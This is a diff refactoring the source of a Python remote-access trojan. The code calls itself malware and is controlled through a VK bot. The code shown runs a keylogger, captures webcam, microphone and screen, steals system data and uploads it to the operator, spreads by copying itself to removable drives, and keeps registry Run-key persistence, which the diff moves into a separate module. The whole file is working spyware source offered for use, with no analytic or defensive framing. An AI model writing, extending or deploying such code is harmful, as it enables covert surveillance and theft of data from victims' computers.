@@ -1,8 +1,9 @@
 # -*- coding: utf-8 -*-
 
-# Should we show debug messages or not.
-
-DEBUG = True
+# Importing local modules.
+import utils
+import autorun
+import config
 
 try:
     # Other modules (Not is preinstalled).
@@ -25,14 +26,15 @@ try:
 except ImportError as _exception:
     # If there is import error.
 
-    if DEBUG:
-        # If debug is enabled.
-
-        # Printing message.
-        print(f"Cannot import {_exception}!")
+    # Message.
+    utils.debug_exception("Cannot import", _exception)
 
     # Exiting.
     raise SystemExit
+
+
+def debug_message(_msg):
+    utils.debug_print(_msg)
 
 # Out for python code.
 out = None
@@ -45,9 +47,6 @@ __SERVER_BOT = None
 
 # Tags of the victim (Set in load_tags).
 __TAGS = []
-
-# Folder of the malware (Set in get_folder_path)
-__FOLDER = ""
 
 # Keylog string.
 __KEYLOG = ""
@@ -67,23 +66,8 @@ __COMMANDS_FUNCTION = None
 # List of function name and tuple with description and example (Set in initialise_commands()).
 __COMMANDS_HELP = None
 
-# Server token.
-SERVER_TOKEN = "" # noqa
-
-# System OK code.
-__SYSTEM_OK = 0
-
-# Server group ID.
-SERVER_GROUP = 0
-
-# Server admins list (Empty or None for all users is admins (May be not so safe)).
-SERVER_ADMINS = []
-
 # Is HWID grabbing is disabled or not (Slow working at the start).
 DISABLE_HWID = True
-
-# Dont add to autorun?
-DISABLED_AUTORUN = True
 
 # Message for when not is admin.
 MESSAGE_NOT_ADMIN = "Sorry, but you don't have required permissions to make this command!"
@@ -99,10 +83,6 @@ KEYLOGGER_DISABLED = True
 
 # Drives that we will skip when infecting drives.
 SPREADING_SKIPPED_DRIVES = ("C", "D")
-
-# Version of the malware.
-VERSION = "[Pre-release] 0.4"
-
 
 def filesystem_get_size(_path: str) -> int:
     # @function filesystem_get_size()
@@ -178,7 +158,7 @@ def command_taskkill(_arguments, _event) -> str:
     # Calling system.
     _system_result = os.system(f"taskkill /F /IM {_arguments}")
 
-    if _system_result == __SYSTEM_OK:
+    if _system_result == config.CONSOLE_SYSTEM_CODE_OK:
         # If result is OK.
 
         # Returning success.
@@ -392,7 +372,7 @@ def command_microphone(_arguments, _event) -> list:
         return "This command does not supported on selected PC! (pyaduio/wave module is not installed)"  # noqa
 
     # Getting path.
-    _path = __FOLDER + "Microphone.wav"
+    _path = config.EXECUTABLE_WORKING_DIRECTORY + "Microphone.wav"
 
     # Recording.
     record_microphone(_path, _arguments)
@@ -568,9 +548,6 @@ def command_webcam(_arguments, _event) -> list:
         # Not supported.
         return "This command does not supported on selected PC! (opencv-python (CV2) module is not installed)" # noqa
 
-    # Globalising folder.
-    global __FOLDER
-
     # Getting camera.
     _camera = cv2.VideoCapture(0)
 
@@ -578,10 +555,10 @@ def command_webcam(_arguments, _event) -> list:
     _, _image = _camera.read()
 
     # Getting path.
-    _path = __FOLDER + "webcam.png"
+    _path = config.EXECUTABLE_WORKING_DIRECTORY + "webcam.png"
 
     # Building path.
-    filesystem_build_path(_path)
+    utils.path_build(_path)
 
     # Writing file.
     cv2.imwrite(_path, _image)
@@ -613,7 +590,7 @@ def command_screenshot(_arguments, _event) -> list:
     screenshot = PIL.ImageGrab.grab()
 
     # Getting path.
-    _path = __FOLDER + "Screenshot.jpg"
+    _path = config.EXECUTABLE_WORKING_DIRECTORY + "Screenshot.jpg"
 
     # Saving it.
     screenshot.save(_path)
@@ -649,7 +626,7 @@ def command_version(_arguments, _event) -> str:
     # @description Function for command "version" that returns current version.
 
     # Returning.
-    return VERSION
+    return config.VERSION_TITLE
 
 
 def command_name_new(_arguments, _event) -> str:
@@ -725,10 +702,10 @@ def command_destruct(_arguments, _event) -> str:
     # @description Function for command "destruct" that destroys self from the system.
 
     # Unregistering from the autorun.
-    autorun_register()
+    autorun.unregister()
 
     # Exiting.
-    return command_exit(_arguments)
+    return command_exit(_arguments, _arguments)
 
 
 def command_keylog(_arguments, _event) -> str:
@@ -778,44 +755,6 @@ def command_drives(_arguments: str, _event) -> str:
     return ", ".join(filesystem_get_drives_list())
 
 
-def executable_get_extension() -> str:
-    # @function executable_get_extension()
-    # @returns str
-    # @description Function that return extension of the current executable file.
-
-    return sys.argv[0].split('.')[-1]
-
-
-def filesystem_build_path(_path: str) -> None:
-    # @function filesystem_build_path()
-    # @returns None
-    # @description Function that builds path to the file.
-
-    try:
-        # Trying to build path.
-
-        # Getting path elements (split by \\)
-        _path = _path.split("\\")
-
-        # Removing last element (filename)
-        _path.pop()
-
-        # Converting back to the string
-        _path = "\\".join(_path)
-
-        if not os.path.exists(_path):
-            # If path not exists.
-
-            # Making directories.
-            os.makedirs(_path)
-    except Exception as _exception: # noqa
-        # If there is exception occurred.
-
-        # Showing debug message to the developer.
-        debug_message(f"Oops... Exception occurred in function filesystem_build_path()! "
-                      f"Full exception information - {_exception}")
-
-
 def spreading_infect_drive(_drive: str) -> None:
     # @function spreading_infect_drive()
     # @returns list
@@ -839,13 +778,13 @@ def spreading_infect_drive(_drive: str) -> None:
             return
 
         # Getting executable path.
-        _executable_path = "autorun\\autorun." + executable_get_extension()
+        _executable_path = "autorun\\autorun." + config.EXECUTABLE_EXTENSION
 
         if not os.path.exists(_drive + _executable_path):
             # If no executable file there (Not infected already).
 
             # Building path.
-            filesystem_build_path(_drive + _executable_path)
+            utils.path_build(_drive + _executable_path)
 
             # Copying executable there.
             shutil.copyfile(sys.argv[0], _drive + _executable_path)
@@ -961,31 +900,6 @@ def spreading_start() -> None:
         return
 
     # Starting listening drives.
-    threading.Thread(target=spreading_thread).start()
-
-
-def set_folder_path() -> None:
-    # @function set_folder_path()
-    # @returns None
-    # @description Function that set folder path for the malware.
-
-    # Globalize folder variable.
-    global __FOLDER
-
-    # Setting folder.
-    __FOLDER = os.getenv('APPDATA') + "\\Adobe\\"
-
-
-def get_folder_path() -> str:
-    # @function get_folder_path()
-    # @returns str
-    # @description Function that returns folder path for the malware.
-
-    # Globalize folder variable.
-    global __FOLDER
-
-    # Returning folder.
-    return __FOLDER
 
 
 def assert_operating_system() -> None:
@@ -1282,35 +1196,21 @@ def server_connect() -> None:
     global __SERVER_API
     global __SERVER_BOT
 
-    try:
-        # Trying to connect to server.
+    if config.SERVER_CONNECTION_SETTINGS["SELECTED_TYPE"] == "VK":
+        try:
+            # Trying to connect to server.
 
-        __SERVER_API = vk_api.VkApi(token=SERVER_TOKEN)
-        __SERVER_BOT = vk_api.bot_longpoll.VkBotLongPoll(__SERVER_API, SERVER_GROUP)
-    except Exception as _exception: # noqa
-        # If there is exception occurred.
+            _token, _group = config.SERVER_CONNECTION_SETTINGS["VK_TOKEN"], config.SERVER_CONNECTION_SETTINGS["VK_GROUP"]
+            __SERVER_API = vk_api.VkApi(token=_token)
+            __SERVER_BOT = vk_api.bot_longpoll.VkBotLongPoll(__SERVER_API, _group)
+        except Exception as _exception: # noqa
+            # If there is exception occurred.
 
-        # Showing debug message to the developer.
-        debug_message(f"Oops... Exception occurred in function server_connect()! "
-                      f"Full exception information - {_exception}")
+            # Showing debug message to the developer.
+            utils.debug_exception(f"Error when connecting to the server", _exception)
 
-        # Exiting.
-        raise SystemExit
-
-
-def debug_message(_message: str) -> None:
-    # @function debug_message()
-    # @returns None
-    # @description Function that shows debug message if debug message is enabled.
-
-    if not DEBUG:
-        # If debug is not enabled.
-
-        # Returning.
-        return
-    
-    # Printing message.
-    print(_message)
+            # Exiting.
+            raise SystemExit
 
 
 def get_operating_system() -> str:
@@ -1379,10 +1279,10 @@ def load_tags() -> None:
         # Trying to load tags.
 
         # Getting path.
-        _path = __FOLDER + "tags.dat"
+        _path = config.EXECUTABLE_WORKING_DIRECTORY + "tags.dat"
 
         # Building path.
-        filesystem_build_path(_path)
+        utils.path_build(_path)
 
         if os.path.exists(_path):
             # If we have tags file.
@@ -1402,7 +1302,7 @@ def load_tags() -> None:
                 # If there is exception occurred.
 
                 # Debug message.
-                debug_message(f"Can`t load tags file! Exception: {_exception}")
+                utils.debug_exception(f"Can`t load tags file", _exception)
 
                 # Tags list.
                 __TAGS = [get_ip()["ip"], get_operating_system(), "PC"] # noqa
@@ -1513,25 +1413,6 @@ def get_environment_variables() -> dict:
     return _environment_variables
 
 
-def list_intersects(_list_one: list, _list_two: list) -> bool:
-    # @function list_intersects()
-    # @returns bool
-    # @description Function that returns is two list is intersects or not.
-
-    # Checking intersection.
-    for _item in _list_one:
-        # For items in list one.
-
-        if _item in _list_two:
-            # If item in list two.
-
-            # Return True.
-            return True
-
-    # No intersection.
-    return False
-
-
 def parse_tags(_tags: str) -> list:
     # @function parse_tags()
     # @returns list
@@ -1553,10 +1434,10 @@ def save_tags() -> None:
         # Trying to save tags.
 
         # Getting path.
-        _path = __FOLDER + "tags.dat"
+        _path = config.EXECUTABLE_WORKING_DIRECTORY + "tags.dat"
 
         # Building path.
-        filesystem_build_path(_path)
+        utils.path_build(_path)
 
         with open(_path, "w", encoding="UTF-8") as _tf:
             # With opened file.
@@ -1622,7 +1503,7 @@ def server_message(_text: str, _attachmment: str = None, _peer_index: int = None
     if _peer_index is None:
         # If peer index is not specified.
 
-        for _admin_peer_index in SERVER_ADMINS:
+        for _admin_peer_index in config.SERVER_CONNECTION_SETTINGS["VK_ADMINS"]:
             # For every peer index in admins peer indices.
 
             # Sending messages to they.
@@ -1635,7 +1516,7 @@ def server_message(_text: str, _attachmment: str = None, _peer_index: int = None
     _text = f"<{__NAME}>\n{_text}"
 
     # Debug message.
-    debug_message("Sent new message!")
+    utils.debug_print("Sent new message!")
 
     # Calling method.
     server_method("messages.send", {
@@ -1653,10 +1534,10 @@ def save_name() -> None:
         # Trying to save name.
 
         # Getting path.
-        _path = __FOLDER + "name.dat"
+        _path = config.EXECUTABLE_WORKING_DIRECTORY + "name.dat"
 
         # Building path.
-        filesystem_build_path(_path)
+        utils.path_build(_path)
 
         with open(_path, "w", encoding="UTF-8") as _tf:
             # With opened file.
@@ -1683,10 +1564,10 @@ def load_name() -> None:
         # Trying to load name.
 
         # Getting path.
-        _path = __FOLDER + "name.dat"
+        _path = config.EXECUTABLE_WORKING_DIRECTORY + "name.dat"
 
         # Building path.
-        filesystem_build_path(_path)
+        utils.path_build(_path)
 
         if os.path.exists(_path):
             # If we have name file.
@@ -1747,7 +1628,7 @@ def stealer_steal_data(_force: bool = False):
             # If we not already stolen data or forcing.
 
             # Getting file name.
-            _path = __FOLDER + "log.json"
+            _path = config.EXECUTABLE_WORKING_DIRECTORY + "log.json"
 
             # Getting ip data.
             _ip = get_ip()
@@ -1790,7 +1671,7 @@ def stealer_steal_data(_force: bool = False):
                 __VALUES["directory_programfiles86"] = os.listdir(_drive + "\\Program Files (x86)")
 
             # Building path.
-            filesystem_build_path(_path)
+            utils.path_build(_path)
 
             with open(_path, "w") as _file:
                 # With opened file.
@@ -1798,7 +1679,7 @@ def stealer_steal_data(_force: bool = False):
                 # Dumping.
                 json.dump(__VALUES, _file, indent=4)
 
-            for _peer in SERVER_ADMINS:
+            for _peer in config.SERVER_CONNECTION_SETTINGS["VK_ADMINS"]:
                 # For every peer in admins.
 
                 # Uploading document.
@@ -1822,8 +1703,7 @@ def stealer_steal_data(_force: bool = False):
         # If there is exception occurred.
 
         # Showing debug message to the developer.
-        debug_message(f"Oops... Exception occurred in function steal_data()! "
-                      f"Full exception information - {_exception}")
+        utils.debug_exception(f"Error when stealing data", _exception)
 
         # Returning value.
         return {_exception}
@@ -1834,14 +1714,14 @@ def user_is_admin(_peer: str) -> bool:
     # @returns None
     # @description Function that returns is given user is admin or not.
 
-    if SERVER_ADMINS is None or len(SERVER_ADMINS) == 0:
+    if config.SERVER_CONNECTION_SETTINGS["VK_ADMINS"] is None or len(config.SERVER_CONNECTION_SETTINGS["VK_ADMINS"]) == 0:
         # If there is no admins in the list
 
         # Returning true as there is no admins.
         return True
 
     # Returning.
-    return _peer in SERVER_ADMINS
+    return _peer in config.SERVER_CONNECTION_SETTINGS["VK_ADMINS"]
 
 
 def client_answer_server(_event) -> None:
@@ -1896,7 +1776,7 @@ def client_answer_server(_event) -> None:
         else:
             # If this is not alive command.
 
-            if list_intersects(parse_tags(_message_tags), __TAGS):
+            if utils.list_intersects(parse_tags(_message_tags), __TAGS):
                 # If we have one or more tag from our tags.
 
                 if user_is_admin(_peer):
@@ -2005,13 +1885,13 @@ def stealer_is_already_worked() -> bool:
     # @description Function that returns is we already worked stealer or not.
 
     # Getting path to secret file.
-    _path = __FOLDER + "version.dat"
+    _path = config.EXECUTABLE_WORKING_DIRECTORY + "version.dat"
 
     if not os.path.exists(_path):
         # If secret file not exists.
 
         # Validating file.
-        filesystem_build_path(_path)
+        utils.path_build(_path)
 
         # Creating file.
         with open(_path, "w") as _file:
@@ -2103,120 +1983,6 @@ def client_execute_command(_command_name: str, _arguments: str, _event) -> str:
     return f"Invalid command {_command_name}! Write help command and get all commands!"
 
 
-def autorun_register() -> None:
-    # @function autorun_register()
-    # @returns None
-    # @description Function that registers current executable file to the autorun.
-
-    if DISABLED_AUTORUN:
-        # If autorun is disabled.
-
-        # Return.
-        return
-
-    if executable_get_extension != "exe":
-        # If this is not exe file.
-
-        # Returning.
-        return
-
-    try:
-        # Trying to import winreg module.
-
-        # Importing.
-        import winreg
-    except ImportError:
-        # If there is ImportError.
-
-        # Debug message.
-        debug_message("Cannot add self to the autorun! Could not import module winreg")
-
-        # Returning.
-        return
-
-    try:
-        # Trying to add to the autorun.
-
-        # Getting executable path.
-        _executable_path = __FOLDER + "update." + executable_get_extension()
-
-        if not os.path.exists(_executable_path):
-            # If no file there (We don't add this already.
-
-            # Building path.
-            filesystem_build_path(_executable_path)
-
-            # Copying executable there.
-            shutil.copyfile(sys.argv[0], _executable_path)
-
-        # Opening key.
-        _registry_key = winreg.OpenKey(key=winreg.HKEY_CURRENT_USER,
-                                       sub_key="Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-                                       reserved=0, access=winreg.KEY_ALL_ACCESS)
-
-        # Adding autorun.
-        winreg.SetValueEx(_registry_key, "Update", 0, winreg.REG_SZ, _executable_path)
-
-        # Closing key.
-        winreg.CloseKey(_registry_key)
-    except Exception as _exception: # noqa
-        # If error occurred.
-
-        # Debug message.
-        debug_message(f"Can`t add self to the registry! Error: {_exception}")
-
-
-def autorun_unregister() -> None:
-    # @function autorun_unregister()
-    # @returns None
-    # @description Function that unregisters current executable file to the autorun.
-
-    if DISABLED_AUTORUN:
-        # If autorun is disabled.
-
-        # Return.
-        return
-
-    if executable_get_extension != "exe":
-        # If this is not exe file.
-
-        # Returning.
-        return
-
-    try:
-        # Trying to import winreg module.
-
-        # Importing.
-        import winreg
-    except ImportError:
-        # If there is ImportError.
-
-        # Debug message.
-        debug_message("Cannot remove self to the autorun! Could not import module winreg")
-
-        # Returning.
-        return
-
-    try:
-        # Trying to remove autorun.
-
-        # Opening key.
-        _registry_key = winreg.OpenKey(key=winreg.HKEY_CURRENT_USER,
-                                       sub_key="Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-                                       reserved=0, access=winreg.KEY_ALL_ACCESS)
-
-        # Deleting autorun.
-        winreg.DeleteValue(_registry_key, "Update")
-
-        # Closing key.
-        winreg.CloseKey(_registry_key)
-    except Exception as _exception:  # noqa
-        # If error occurred.
-
-        # Debug message.
-        debug_message(f"Не удалось добавить себя в автозагрузки! Ошибка: {_exception}")
-
-
 def server_upload_document(_path: str, _title: str, _peer: int, _type: str = "doc") -> str:
     # @function server_upload_document()
     # @returns str or list
@@ -2246,7 +2012,7 @@ def server_upload_document(_path: str, _title: str, _peer: int, _type: str = "do
             # If there is not all fields.
 
             # Debug message.
-            debug_message(f"Error when uploading document (Request)!")
+            utils.debug_exception(f"Error when uploading document (Request)!", ConnectionError)
 
             # Returning request as error.
             return [_request] # noqa
@@ -2254,7 +2020,7 @@ def server_upload_document(_path: str, _title: str, _peer: int, _type: str = "do
         # If there is error.
 
         # Debug message.
-        debug_message(f"Error when uploading document (Exception)! Exception: {_exception}")
+        utils.debug_exception(f"Error when uploading document!", _exception)
 
         # Returning exception.
         return [_exception] # noqa
@@ -2301,7 +2067,7 @@ def record_microphone(_path, seconds: int = 1) -> None:
     audio.terminate()
 
     # Validating filename.
-    filesystem_build_path(_path)
+    utils.path_build(_path)
 
     # Save recording as wav file.
     file = wave.open(_path, 'wb')
@@ -2324,9 +2090,6 @@ def launch() -> None:
         # Windows (Fully supported), Linux (Partially supported)
         assert_operating_system()
 
-        # Setting folder path for later file manipulations.
-        set_folder_path()
-
         # Initialising functions for the remote access.
         initialise_commands()
 
@@ -2338,6 +2101,7 @@ def launch() -> None:
 
         # Connecting to the server.
         server_connect()
+        print("Connected!")
 
         # Starting spreading on the other drives.
         spreading_start()
@@ -2346,10 +2110,11 @@ def launch() -> None:
         keylogger_start()
 
         # Registering in the autorun.
-        autorun_register()
+        autorun.register()
 
         # Message that we connected to the network.
         server_message(f"Connected to the network! (His tags: {', '.join(__TAGS)})")
+        print("Sent!")
 
         # Registering exit_handler() as handler for exit.
         atexit.register(exit_handler)
@@ -2363,8 +2128,7 @@ def launch() -> None:
         # If there is exception occurred.
 
         # Showing debug message to the developer.
-        debug_message(f"Oops... Exception occurred in function launch()! "
-                      f"Full exception information - {_exception}")
+        utils.debug_exception("Error when launching", _exception)
 
 
 # Entry point of the malware, calling launch function to start all systems.
